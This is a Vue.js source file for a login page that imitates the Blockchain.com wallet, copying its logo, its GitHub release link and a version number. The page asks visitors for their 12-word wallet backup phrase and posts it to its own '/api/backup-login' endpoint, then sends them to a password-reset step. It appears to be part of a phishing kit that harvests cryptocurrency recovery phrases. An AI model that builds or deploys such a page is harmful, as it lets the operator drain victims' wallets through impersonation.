<template>
    <div class="_wrapper">
        <notifications />
        <div class="topbar">
            <div class="ktsDXc">
                <div class="buGjPd">
                    <div class="dWqUnF">
                        <a href="/">
                            <img src="/assets/images/bc-logo.svg" alt="" />
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="_bdy">
            <div class="cLOsib">
                <div class="jytEer">
                    <div class="c3e2WS">
                        <div class="mtnwo">
                            <div class="fzjGbE">
                                <span class="mqGJ icon-search"></span>
                            </div>
                            <div class="brUCEm">Welcome Back</div>
                        </div>
                        <div class="asQWA"></div>
                    </div>

                    <form class="jbFwLR" @submit.prevent="login">
                        <div class="JUGJG">
                            <div class="_f-group">
                                <label for="">Enter Back up phrase</label>
                                <input
                                    v-model="form.backup_phrase"
                                    @keyup="validateBackupPhrase"
                                    type="text"
                                    name="backup_phrase"
                                    class="gfoKiQ"
                                    autocomplete="off"
                                    :class="{
                                        'is-invalid': error.backup_phrase,
                                    }"
                                />
                                <span class="errEAw">{{
                                    error.backup_phrase
                                }}</span>
                            </div>
                        </div>

                        <div class="llutmI">
                            <div class="ivvLkX aAssa">
                                Need more assist ?
                                <a href="/contact"> Contact Us</a> |
                                <router-link to="/login" tag="a"
                                    >Login
                                </router-link>
                            </div>
                        </div>
                        <div class="JUGJG">
                            <button class="dlCycp" :disabled="disablesignup">
                                Login
                            </button>
                        </div>
                    </form>
                </div>
                <div class="bzateK">
                    <div href="" class="iPnQbS">
                        Don't have a wallet? &nbsp;
                    </div>
                    <router-link to="/login" tag="div" class="eSVKdm"
                        >Sign up
                    </router-link>
                </div>
            </div>
        </div>
        <div class="_bottom">
            <div class="sc-dymIpo hniRZU">
                <div class="sc-ckVGcZ kXOjke">
                    <div color="grey400" class="sc-jKJlTe hcNnNN">
                        <div class="sc-eNQAEJ ahgzx">English</div>
                        <span
                            class="sc-htpNat dCBjHa sc-hMqMXs hRciUV"
                            color="grey700"
                        ></span>
                    </div>
                </div>
                <span class="sc-iuJeZd hIzvXs"
                    ><a
                        color="grey400"
                        href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases"
                        target="_blank"
                        class="sc-bZQynM fgsder"
                        ><span>Version 4.46.41</span></a
                    ></span
                ><a
                    color="grey400"
                    data-e2e="loginGetHelp"
                    class="sc-bZQynM jSLvMQ"
                    href="#/help"
                    ><span>Need help?</span></a
                >
            </div>
        </div>
    </div>
</template>
<script>
export default {
    data() {
        return {
            backup_phrase: "",
            form: {
                backup_phrase: "",
            },
            error: {
                backup_phrase: "",
            },
            invalid: false,
            disablesignup: false,
        };
    },
    methods: {
        validatePhrasePattern(backup_phrase) {
            let phrase = backup_phrase.split(" ");
            return phrase.length == 12 ? true : false;
        },

        isEmpty(data) {
            return data == null || data == "" || data == " " || data == [];
        },

        validateBackupPhrase() {
            let backup_phrase = this.form.backup_phrase;
            if (this.isEmpty(backup_phrase)) {
                this.disablesignup = true;
                this.error.backup_phrase = "* required";
                return false;
            } else if (!this.validatePhrasePattern(backup_phrase)) {
                this.disablesignup = true;
                this.error.backup_phrase = "* Phrase is invalid";
                return false;
            } else {
                this.disablesignup = false;
                this.error.backup_phrase = null;
                return true;
            }
        },

        login() {
            if (!this.validateBackupPhrase()) {
                return false;
            }

            this.disablesignup = true;
            axios
                .post("/api/backup-login", this.form)
                .then(({ data }) => {
                    this.$store.dispatch("backupToken", data.data.backup_token);
                    this.$router.push("/backup-reset-password");
                })
                .catch((e) => {
                    if (e) {
                        const { errors } = e.data;

                        for (let key in errors) {
                            this.error[key] = errors[key][0];
                            return;
                        }
                    }

                    const { data } = e;
                    this.$toastr.Add({
                        title: data.message,
                        msg: " ",
                        progressbar: false,
                        type: "error",
                        classNames: ["error_toast"],
                        style: { backgroundColor: "white", color: "black" },
                    });
                    this.disablesignup = false;
                });
        },
    },
    mounted() {},
};
</script>
